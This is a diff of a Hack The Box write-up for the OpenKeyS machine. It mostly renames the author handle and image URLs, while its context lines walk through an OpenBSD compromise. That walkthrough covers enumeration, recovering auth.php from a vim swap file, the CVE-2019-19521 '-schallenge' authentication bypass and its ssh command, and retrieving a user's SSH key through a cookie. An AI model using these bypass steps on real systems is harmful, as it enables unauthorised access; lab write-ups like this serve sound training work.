@@ -9,6 +9,7 @@ avatar: assets/htb/openkeys.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/OpenKeyS
 ---
+
 ## Useful Skills and Tools
 
 #### Recover a file from a vim .swp file
@@ -22,7 +23,7 @@ htb_url: https://app.hackthebox.com/machines/OpenKeyS
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ nmap -p- -sCV -n -v -oA openkeys <YOUR_IP>                                                 130 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-12 18:53 EST
 NSE: Loaded 153 scripts for scanning.
@@ -100,16 +101,16 @@ Nmap done: 1 IP address (1 host up) scanned in 717.23 seconds
 
 Only two ports open, 22 - SSH and 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-port-80.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-port-80.png)
 
 HTTP leads to login page
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-dirbuster%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-dirbuster%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-includes.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-includes.png)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ gobuster dir -u http://<YOUR_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
 ===============================================================
 Gobuster v3.0.1
@@ -138,16 +139,16 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 There wasn't anything to do with the login page so I ran gobuster on it, there was an `/includes` folder where I was able to download the files `auth.php` and `auth.php.swp`.  `Auth.php` didn't have anything in it so I tried the `.swp` file instead.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-auth-php-swp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-auth-php-swp.png)
 
 Since I didn't know what it was, I opened the `.swp` file using vim and found a potential username `jennifer`, along with a file directory for `auth.php` and the hostname `openkeys.htb`.  Doing a little bit of research showed me that a `.swp` file was a vim recovery file.  I also found that I could get the file contents back using the directions from: [https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file](https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ vim -r auth.php.swp
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-auth-php-swp-recovery.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-auth-php-swp-recovery.png)
 
 Using the `-r` flag for vim I was able to recover the file `/var/www/htdocs/includes/auth.php` from the `.swp` file.
 
@@ -194,23 +195,23 @@ function is_active_session()
 }
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-found-check_auth.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-found-check_auth.png)
 
 The `authenticate()` function stuck out to me since it pointed to a directory I hadn't found yet.  escapeshellcmd? `../auth_helpers/check_auth`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-check_auth.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-check_auth.png)
 
 By navigating to the path `http://<YOUR_IP>/../auth_helpers/check_auth` I was able to download the `check_auth` program.  \[Ignore the fact that it looks like this is on the `/includes` page, when it loaded the file to download there was no HTML to display.\]
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ file check_auth                      
 check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
 ```
 
 googled `/usr/libexec/ld.so` - [https://man.netbsd.org/libexec/ld.so.1](https://man.netbsd.org/libexec/ld.so.1)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-ld-so.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-ld-so.png)
 
 found exploit for this file on openbsd - [https://www.exploit-db.com/exploits/47780](https://www.exploit-db.com/exploits/47780)
 
@@ -219,7 +220,7 @@ found exploit for this file on openbsd - [https://www.exploit-db.com/exploits/47
 Will have to remember this one when I gain access to the machine
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ strings check_auth           
 /usr/libexec/ld.so
 OpenBSD
@@ -314,7 +315,7 @@ OpenBSD, /usr/libexec/ld.so, libc.so.95.1 looked like places to start investigat
 [https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/](https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd <YOUR_IP>
 OpenSSH_8.3p1 Debian-1, OpenSSL 1.1.1g  21 Apr 2020
 debug1: Reading configuration data /dev/null
@@ -360,22 +361,19 @@ So the system seemed like it was vulnerable, but I was still not sure how to exp
 
  CVE-2019-19521: Authentication bypass
 
-> This is the second piece of the puzzle: if an attacker specifies the
- username "-schallenge" \(or "-schallenge:passwd" to force a passwd-style
- authentication\), then the authentication is automatically successful and
- therefore bypassed.
+> This is the second piece of the puzzle: if an attacker specifies the username "-schallenge" \(or "-schallenge:passwd" to force a passwd-style authentication\), then the authentication is automatically successful and therefore bypassed.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-schallenge.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge.png)
 
 After logging in with the username and password `-schallenge` I got this page.  `sshkey.php` sounded very interesting.
 
 Since it did not like this username, I tried different methods of specifying another username.  The only possibility I had at this time was `jennifer` \(and this still felt like a stretch since I had only seen it in the header of that swap file...\)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-schallenge-test-jennifer.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge-test-jennifer.png)
 
 Putting the username in the cookie seemed like a good bet, and logging in with the bypass and doing this gave me a redirect on the login page
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-schallenge-jennifer.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge-jennifer.png)
 
 After getting a valid logged in PHP session ID, I tried multiple ways of specifying the only username I had found. I was able to give the name in the cookie on the `sshkey.php` page and get a response back!
 
@@ -435,12 +433,12 @@ qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=<br />
 
 The service gave me an SSH key for the user `jennifer`!
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-schallenge-jennifer-key.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-schallenge-jennifer-key.png)
 
 It was easier to copy the key from the web browser since it didn't have the extra formatting.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ ssh jennifer@<YOUR_IP> -i jennifer.key 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@ -451,14 +449,14 @@ This private key will be ignored.
 Load key "jennifer.key": bad permissions
 jennifer@<YOUR_IP>'s password:                                                                    
 
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ chmod 600 jennifer.key 
 ```
 
 Always use protection when reusing other people's keys.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/openkeys]
+┌──(kac0㉿kali)-[~/htb/openkeys]
 └─$ ssh jennifer@<YOUR_IP> -i jennifer.key
 Last login: Thu Nov 12 17:47:14 2020 from 10.10.14.223
 OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019
@@ -510,7 +508,7 @@ drwx------  2 jennifer  jennifer    512 Jan 13  2020 .ssh
 -rwxr-xr-x  1 jennifer  jennifer  14768 Nov 12 17:55 swrast_dri.so
 -rw-r-----  1 jennifer  jennifer     33 Jan 14  2020 user.txt
 openkeys$ cat user.txt                                                                                
-36ab****2b10
+36ab************************2b10
 ```
 
 `jennifer` had the user.txt flag in the user's folder
@@ -900,7 +898,7 @@ uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 
 openkeys.htb
 
 openkeys# cat /root/root.txt
-f3a5****6efa
+f3a5************************6efa
 
 openkeys# cat /etc/shadow
 cat: /etc/shadow: No such file or directory
